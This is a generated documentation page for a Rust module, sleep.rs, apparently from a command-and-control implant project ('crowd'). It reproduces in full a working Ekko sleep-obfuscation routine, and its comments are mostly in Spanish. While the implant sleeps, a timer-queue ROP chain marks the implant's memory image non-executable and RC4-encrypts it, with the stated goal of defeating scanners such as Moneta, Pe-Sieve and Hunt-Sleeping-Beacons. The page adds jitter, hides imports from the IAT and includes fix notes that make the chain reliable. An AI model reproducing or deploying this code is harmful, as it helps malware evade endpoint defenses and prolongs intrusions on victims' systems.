# crowd — sleep.rs  (⚡ GOD TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/sleep.rs` |
| **Lines** | 354 |
| **Tier** | S |
| **Cards** | T005-ekko-sleep |
| **Role** | Sleep obfuscation dispatcher |
| **Unsafe blocks** | 5 |

## Purpose

# crowd — sleep.rs  (⚡ GOD TIER)

## Ekko — Real Sleep Obfuscation via Timer Queue ROP Chain

Implementación completa basada en:
- `legacy/ekko_common.rs` (RtlCaptureContext vía GetProcAddress + NtContinue vía timer)
- `legacy/ekko_smukx.rs` (variante "smart" con loop de timers y callbacks typados)

## Cómo funciona (la cadena ROP real):

```text
1. RtlCaptureContext(&ctx_thread) — captura el contexto del hilo PRINCIPAL (main thread)
Ejecutado DIRECTAMENTE en el hilo que llama a ekko(), NO en un timer callback.
El Rip del contexto capturado se modifica para apuntar al punto de retorno
(post-WaitForSingleObject) para que NtContinue final restaure correctamente.

2. [t+100ms] NtContinue(&rop_prot_rw)
→ VirtualProtect(image_base, image_size, PAGE_READWRITE)
La imagen propia pasa a RW → el shellcode/image en memoria ya no es executable
→ Win32 scanners ven memoria inerte

3. [t+200ms] NtContinue(&rop_mem_enc)
→ SystemFunction032(&img, &key)  [RC4]
Cifra TODA la imagen en memoria con la key de 16 bytes
→ strings, imports, shellcode: todo encriptado en RAM

4. [t+300ms] NtContinue(&rop_delay)
→ WaitForSingleObject(INVALID_HANDLE_VALUE, sleep_ms)
El hilo del timer pool duerme. Durante este tiempo:
- la imagen está PAGE_READWRITE (no ejecutable)
- la imagen está cifrada con RC4
- Moneta/Pe-Sieve/Hunt-Sleeping-Beacons ven solo basura cifrada

5. [t+300ms+sleep_ms] NtContinue(&rop_mem_dec)
→ SystemFunction032(&img, &key)  [RC4 inverso = idempotente]
Descifra la imagen (RC4 es su propio inverso)

6. [t+400ms+sleep_ms] NtContinue(&rop_prot_rx)
→ VirtualProtect(image_base, image_size, PAGE_EXECUTE_READ)
Restaura protección original

7. [t+500ms+sleep_ms] NtContinue(&rop_set_evt)
→ SetEvent(h_event)
Señala al hilo principal que terminó

8. WaitForSingleObject(h_event, INFINITE) — hilo principal espera el SetEvent
```

## Por qué es Tier S
- Los ROP frames se ejecutan en HILOS DEL TIMER POOL, no en el hilo principal
- NtContinue restaura el contexto completo (RIP, RSP, registros) → parece ejecución nativa
- Durante el sleep: memoria PAGE_READWRITE + RC4-cifrada → ningún scanner puede verificar firmas
- VirtualProtect es llamado desde el timer thread (hilo del sistema), no desde el payload
- Cada ROP frame tiene un return gadget válido en [RSP] para evitar crashes del timer thread

## Types

### struct `UString` (line 73)

## Public API

### `ekko` `unsafe` (line 150)
```rust
pub unsafe fn ekko(sleep_ms: u32, key: &[u8; 16])
```
Ekko Sleep Obfuscation completo.

# Parámetros
- `sleep_ms`: tiempo de sleep en milisegundos.
- `key`: clave RC4 de exactamente 16 bytes para cifrado de imagen.

# Requisitos
Debe ejecutarse desde el hilo principal del agente. RtlCaptureContext se llama
directamente en el hilo que invoca ekko() para capturar el contexto correcto.
Luego programa los frames ROP en el timer pool y bloquea en WaitForSingleObject.

### `ekko_sleep_dynamic` (line 328)
```rust
pub fn ekko_sleep_dynamic(ms: u64)
```
Sleep con ofuscación de memoria para `crowd`.
Jitter ±12.5% + cadena ROP completa (Ekko real).
Key: 16 bytes from CSPRNG (thread_rng).

## Internal Functions

- `cb_nt_continue` — Timer 1..N: llama NtContinue(context) para ejecutar el ROP frame. (line 83)
- `find_ret_gadget` (unsafe) — Scan a loaded module (e.g. ntdll) for a `ret` instruction (0xC3). (line 106)
- `plain_sleep_ms` — Fallback: NtDelayExecution directo (sin ofuscación de memoria). (line 343)

## Key Dependencies

- `use rand::{thread_rng, Rng};`
- `use winapi::ctypes::c_void;`
- `use winapi::shared::ntdef::{NTSTATUS, PVOID};`
- `use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};`
- `use winapi::um::synchapi::{CreateEventW, WaitForSingleObject};`
- `use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};`
- `use winapi::um::winnt::{`

## Full Source

```rust
//! # crowd — sleep.rs  (⚡ GOD TIER)
//!
//! ## Ekko — Real Sleep Obfuscation via Timer Queue ROP Chain
//!
//! Implementación completa basada en:
//!   - `legacy/ekko_common.rs` (RtlCaptureContext vía GetProcAddress + NtContinue vía timer)
//!   - `legacy/ekko_smukx.rs` (variante "smart" con loop de timers y callbacks typados)
//!
//! ## Cómo funciona (la cadena ROP real):
//!
//! ```text
//! 1. RtlCaptureContext(&ctx_thread) — captura el contexto del hilo PRINCIPAL (main thread)
//!    Ejecutado DIRECTAMENTE en el hilo que llama a ekko(), NO en un timer callback.
//!    El Rip del contexto capturado se modifica para apuntar al punto de retorno
//!    (post-WaitForSingleObject) para que NtContinue final restaure correctamente.
//!
//! 2. [t+100ms] NtContinue(&rop_prot_rw)
//!    → VirtualProtect(image_base, image_size, PAGE_READWRITE)
//!    La imagen propia pasa a RW → el shellcode/image en memoria ya no es executable
//!    → Win32 scanners ven memoria inerte
//!
//! 3. [t+200ms] NtContinue(&rop_mem_enc)
//!    → SystemFunction032(&img, &key)  [RC4]
//!    Cifra TODA la imagen en memoria con la key de 16 bytes
//!    → strings, imports, shellcode: todo encriptado en RAM
//!
//! 4. [t+300ms] NtContinue(&rop_delay)
//!    → WaitForSingleObject(INVALID_HANDLE_VALUE, sleep_ms)
//!    El hilo del timer pool duerme. Durante este tiempo:
//!      - la imagen está PAGE_READWRITE (no ejecutable)
//!      - la imagen está cifrada con RC4
//!      - Moneta/Pe-Sieve/Hunt-Sleeping-Beacons ven solo basura cifrada
//!
//! 5. [t+300ms+sleep_ms] NtContinue(&rop_mem_dec)
//!    → SystemFunction032(&img, &key)  [RC4 inverso = idempotente]
//!    Descifra la imagen (RC4 es su propio inverso)
//!
//! 6. [t+400ms+sleep_ms] NtContinue(&rop_prot_rx)
//!    → VirtualProtect(image_base, image_size, PAGE_EXECUTE_READ)
//!    Restaura protección original
//!
//! 7. [t+500ms+sleep_ms] NtContinue(&rop_set_evt)
//!    → SetEvent(h_event)
//!    Señala al hilo principal que terminó
//!
//! 8. WaitForSingleObject(h_event, INFINITE) — hilo principal espera el SetEvent
//! ```
//!
//! ## Por qué es Tier S
//! - Los ROP frames se ejecutan en HILOS DEL TIMER POOL, no en el hilo principal
//! - NtContinue restaura el contexto completo (RIP, RSP, registros) → parece ejecución nativa
//! - Durante el sleep: memoria PAGE_READWRITE + RC4-cifrada → ningún scanner puede verificar firmas
//! - VirtualProtect es llamado desde el timer thread (hilo del sistema), no desde el payload
//! - Cada ROP frame tiene un return gadget válido en [RSP] para evitar crashes del timer thread

#![allow(dead_code)]

use rand::{thread_rng, Rng};
use std::mem;
use std::ptr::{null, null_mut};
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{NTSTATUS, PVOID};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use winapi::um::synchapi::{CreateEventW, WaitForSingleObject};
use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};
use winapi::um::winnt::{
    RtlCaptureContext, CONTEXT, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    WAITORTIMERCALLBACK, WT_EXECUTEINTIMERTHREAD,
};

/// Estructura RC4 que recibe SystemFunction032 (Advapi32)
#[repr(C)]
pub struct UString {
    pub length:     u32,
    pub max_length: u32,
    pub buffer:     *mut c_void,
}

// ── Callbacks del timer pool ──────────────────────────────────────────────────

/// Timer 1..N: llama NtContinue(context) para ejecutar el ROP frame.
/// NtContinue restaura RIP/RSP/registros → ejecuta la función apuntada por RIP del frame.
extern "system" fn cb_nt_continue(
    lp_parameter: *mut c_void,
    _dw_timer_low_value: u8,
) {
    let context = lp_parameter as *mut CONTEXT;
    unsafe {
        let nt_cont: unsafe extern "system" fn(*mut CONTEXT, u8) -> NTSTATUS =
            std::mem::transmute(GetProcAddress(
                GetModuleHandleA("ntdll\0".as_ptr() as *const i8),
                "NtContinue\0".as_ptr() as *const i8,
            ));
        nt_cont(context, 0);
    }
}

// ── ROP gadget finder ─────────────────────────────────────────────────────────

/// Scan a loaded module (e.g. ntdll) for a `ret` instruction (0xC3).
/// Returns the address of the first 0xC3 byte found in the module's first
/// executable section (.text), or 0 if not found.
///
/// This is the standard ROP gadget discovery technique: find a single-byte
/// `ret` instruction to use as a safe return address in fabricated CONTEXT frames.
unsafe fn find_ret_gadget(module_base: *const u8) -> u64 {
    if module_base.is_null() {
        return 0;
    }
    let dos = module_base as *const IMAGE_DOS_HEADER;
    let nt = (module_base as u64 + (*dos).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;

    // Walk the section table to find the first executable section (.text)
    let section_count = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as u64
        + mem::size_of::<u32>() as u64                               // Signature
        + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>() as u64
        + (*nt).FileHeader.SizeOfOptionalHeader as u64)
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;

    for i in 0..section_count {
        let section = &*first_section.add(i);
        // IMAGE_SCN_MEM_EXECUTE = 0x20000000
        if section.Characteristics & 0x2000_0000 != 0 {
            let section_va = module_base.add(section.VirtualAddress as usize);
            let section_sz = *section.Misc.VirtualSize() as usize;
            // Scan for 0xC3 (ret)
            for offset in 0..section_sz {
                if *section_va.add(offset) == 0xC3 {
                    return section_va.add(offset) as u64;
                }
            }
        }
    }
    0
}

// ── Ekko principal ────────────────────────────────────────────────────────────

/// Ekko Sleep Obfuscation completo.
///
/// # Parámetros
/// - `sleep_ms`: tiempo de sleep en milisegundos.
/// - `key`: clave RC4 de exactamente 16 bytes para cifrado de imagen.
///
/// # Requisitos
/// Debe ejecutarse desde el hilo principal del agente. RtlCaptureContext se llama
/// directamente en el hilo que invoca ekko() para capturar el contexto correcto.
/// Luego programa los frames ROP en el timer pool y bloquea en WaitForSingleObject.
pub unsafe fn ekko(sleep_ms: u32, key: &[u8; 16]) {
    // Resolución dinámica de funciones (sin imports directos en la IAT)
    let h_ntdll  = LoadLibraryA("ntdll\0".as_ptr() as *const i8);
    let h_k32    = LoadLibraryA("kernel32.dll\0".as_ptr() as *const i8);
    let h_adv    = LoadLibraryA("Advapi32.dll\0".as_ptr() as *const i8);

    let rtl_capture_context = GetProcAddress(h_ntdll, "RtlCaptureContext\0".as_ptr() as *const i8) as u64;
    let nt_continue          = GetProcAddress(h_ntdll, "NtContinue\0".as_ptr()         as *const i8) as u64;
    let system_function032   = GetProcAddress(h_adv,   "SystemFunction032\0".as_ptr()  as *const i8) as u64;
    let virt_protect         = GetProcAddress(h_k32,   "VirtualProtect\0".as_ptr()     as *const i8) as u64;
    let wait_single_obj      = GetProcAddress(h_k32,   "WaitForSingleObject\0".as_ptr() as *const i8) as u64;
    let set_event_fn         = GetProcAddress(h_k32,   "SetEvent\0".as_ptr()           as *const i8) as u64;

    if [rtl_capture_context, nt_continue, system_function032,
        virt_protect, wait_single_obj, set_event_fn].iter().any(|&p| p == 0) {
        // Fallback silencioso: simplesl sleep sin ofuscación
        plain_sleep_ms(sleep_ms as u64);
        return;
    }

    // ── Calcular image_base + image_size vía DOS/NT headers ─────────────────
    let image_base = GetModuleHandleA(null()) as *mut c_void;
    let dos        = image_base as *const IMAGE_DOS_HEADER;
    let nt         = (image_base as u64 + (*dos).e_lfanew as u64) as *const IMAGE_NT_HEADERS64;
    let image_size = (*nt).OptionalHeader.SizeOfImage;

    // ── Heap-allocate ROP data outside the image range ────────────────────
    // Stack locals live inside the PE image and get RC4-encrypted by Frame 2.
    // Box puts them on the process heap which is outside image_base..+image_size.
    let mut key_buf = Box::new(*key);
    let key_ustr = Box::new(UString {
        length:     16,
        max_length: 16,
        buffer:     key_buf.as_mut_ptr() as *mut c_void,
    });
    let mut img_ustr = Box::new(UString {
        length:     image_size,
        max_length: image_size,
        buffer:     image_base,
    });

    // ── Infraestructura timer ─────────────────────────────────────────────────
    let h_timer_queue = CreateTimerQueue();
    let h_event       = CreateEventW(null_mut(), 0, 0, null());

    if h_timer_queue.is_null() || h_event.is_null() {
        plain_sleep_ms(sleep_ms as u64);
        return;
    }

    // ── 7 frames de contexto ROP ──────────────────────────────────────────────
    let mut ctx_thread:   CONTEXT = mem::zeroed();
    #[allow(unused_assignments)]
    let (mut rop_prot_rw, mut rop_mem_enc, mut rop_delay,
         mut rop_mem_dec, mut rop_prot_rx, mut rop_set_evt)
        = (mem::zeroed(), mem::zeroed(), mem::zeroed(),
           mem::zeroed(), mem::zeroed(), mem::zeroed());

    // BUG 2 FIX: RtlCaptureContext MUST be called directly on the main thread.
    // The old code dispatched it via CreateTimerQueueTimer(delay=0), which captured
    // a timer pool thread's context (wrong RIP, wrong RSP, wrong everything).
    // Now we capture the main thread's context inline, so the ROP chain frames
    // derived from it have the correct stack and register state.
    RtlCaptureContext(&mut ctx_thread);

    // ── Construir frames ROP ──────────────────────────────────────────────────
    // Cada frame es una copia del ctx_thread con RIP + args modificados.
    // NtContinue restaura el CONTEXT completo, dirigiendo ejecución a RIP.
    //
    // BUG 1 FIX: Each ROP frame must have a valid return address written at [RSP].
    // The old code did `Rsp -= 8` to make room for a return address but never
    // wrote anything there — the value at [RSP] was undefined garbage. When the
    // target function (VirtualProtect, SystemFunction032, etc.) executed `ret`,
    // it popped this garbage value and jumped to an invalid address, crashing
    // the timer pool thread and breaking the entire chain.
    //
    // Fix: Find a `ret` (0xC3) gadget in ntdll and write its address at [RSP]
    // for each frame. When the target function returns, it jumps to `ret` which
    // pops again and gracefully terminates the frame. This is the standard Ekko
    // pattern — each frame is independently fired by a timer, so the return just
    // needs to be clean (not chain to the next frame).

    // Find a `ret` (0xC3) gadget in ntdll for the return address of each ROP frame.
    // We scan ntdll's .text section for a 0xC3 byte. This is standard ROP technique.
    let ret_gadget = find_ret_gadget(h_ntdll as *const u8);
    if ret_gadget == 0 {
        // If we can't find a ret gadget, fall back to plain sleep
        DeleteTimerQueueEx(h_timer_queue, null_mut());
        plain_sleep_ms(sleep_ms as u64);
        return;
    }

    let mut old_protect: Box<u32> = Box::new(0);
    let nc: WAITORTIMERCALLBACK = std::mem::transmute(nt_continue);

    // Frame 1: VirtualProtect(image_base, image_size, PAGE_READWRITE, &old_protect)
    rop_prot_rw = ctx_thread;
    rop_prot_rw.Rsp -= 8;
    *(rop_prot_rw.Rsp as *mut u64) = ret_gadget;  // return gadget at [RSP]
    rop_prot_rw.Rip  = virt_protect;
    rop_prot_rw.Rcx  = image_base as u64;
    rop_prot_rw.Rdx  = image_size as u64;
    rop_prot_rw.R8   = 0x04; // PAGE_READWRITE
    rop_prot_rw.R9   = &mut *old_protect as *mut u32 as u64;

    // Frame 2: SystemFunction032(&img, &key)  → RC4 encrypt
    rop_mem_enc = ctx_thread;
    rop_mem_enc.Rsp -= 8;
    *(rop_mem_enc.Rsp as *mut u64) = ret_gadget;  // return gadget at [RSP]
    rop_mem_enc.Rip  = system_function032;
    rop_mem_enc.Rcx  = &mut *img_ustr as *mut _ as u64;
    rop_mem_enc.Rdx  = &*key_ustr     as *const _ as u64;

    // Frame 3: WaitForSingleObject(-1, sleep_ms)  → sleep real
    rop_delay = ctx_thread;
    rop_delay.Rsp -= 8;
    *(rop_delay.Rsp as *mut u64) = ret_gadget;  // return gadget at [RSP]
    rop_delay.Rip  = wait_single_obj;
    rop_delay.Rcx  = -1isize as u64; // INVALID_HANDLE_VALUE
    rop_delay.Rdx  = sleep_ms as u64;

    // Frame 4: SystemFunction032(&img, &key)  → RC4 decrypt (idempotente)
    rop_mem_dec = ctx_thread;
    rop_mem_dec.Rsp -= 8;
    *(rop_mem_dec.Rsp as *mut u64) = ret_gadget;  // return gadget at [RSP]
    rop_mem_dec.Rip  = system_function032;
    rop_mem_dec.Rcx  = &mut *img_ustr as *mut _ as u64;
    rop_mem_dec.Rdx  = &*key_ustr     as *const _ as u64;

    // Frame 5: VirtualProtect(image_base, image_size, PAGE_EXECUTE_READ, &old_protect)
    rop_prot_rx = ctx_thread;
    rop_prot_rx.Rsp -= 8;
    *(rop_prot_rx.Rsp as *mut u64) = ret_gadget;  // return gadget at [RSP]
    rop_prot_rx.Rip  = virt_protect;
    rop_prot_rx.Rcx  = image_base as u64;
    rop_prot_rx.Rdx  = image_size as u64;
    rop_prot_rx.R8   = 0x20; // PAGE_EXECUTE_READ
    rop_prot_rx.R9   = &mut *old_protect as *mut u32 as u64;

    // Frame 6: SetEvent(h_event)  → señala al WaitForSingleObject del hilo principal
    rop_set_evt = ctx_thread;
    rop_set_evt.Rsp -= 8;
    *(rop_set_evt.Rsp as *mut u64) = ret_gadget;  // return gadget at [RSP]
    rop_set_evt.Rip  = set_event_fn;
    rop_set_evt.Rcx  = h_event as u64;

    // ── Encolar ROP frames con delays escalonados ─────────────────────────────
    let mut h_timer: *mut c_void = null_mut();
    let frames: [(*const CONTEXT, u32); 6] = [
        (&rop_prot_rw,  100),
        (&rop_mem_enc,  200),
        (&rop_delay,    300),
        (&rop_mem_dec,  300 + sleep_ms + 100),
        (&rop_prot_rx,  300 + sleep_ms + 200),
        (&rop_set_evt,  300 + sleep_ms + 300),
    ];

    for (ctx_ptr, delay_ms) in frames {
        CreateTimerQueueTimer(
            &mut h_timer,
            h_timer_queue,
            nc,
            ctx_ptr as PVOID,
            delay_ms, 0, WT_EXECUTEINTIMERTHREAD,
        );
    }

    // Bloquea hasta que rop_set_evt señale h_event (post-decrypt + post-restore)
    WaitForSingleObject(h_event, 0xFFFF_FFFF);

    DeleteTimerQueueEx(h_timer_queue, null_mut());
}

// ── API pública ───────────────────────────────────────────────────────────────

/// Sleep con ofuscación de memoria para `crowd`.
/// Jitter ±12.5% + cadena ROP completa (Ekko real).
/// Key: 16 bytes from CSPRNG (thread_rng).
pub fn ekko_sleep_dynamic(ms: u64) {
    let mut rng = thread_rng();
    let jitter: u64 = rng.gen_range(0..(ms / 8).max(1));
    let total = (ms + jitter) as u32;

    let mut key = [0u8; 16];
    rng.fill(&mut key);

    unsafe {
        ekko(total, &key);
    }
}

/// Fallback: NtDelayExecution directo (sin ofuscación de memoria).
/// Se usa si la resolución de funciones falla.
fn plain_sleep_ms(ms: u64) {
    let ticks: i64 = -((ms as i64) * 10_000);
    unsafe {
        let h_ntdll = LoadLibraryA("ntdll\0".as_ptr() as *const i8);
        let nt_delay: extern "system" fn(u8, *const i64) -> i32 =
            std::mem::transmute(GetProcAddress(
                h_ntdll,
                "NtDelayExecution\0".as_ptr() as *const i8,
            ));
        nt_delay(0, &ticks);
    }
}

```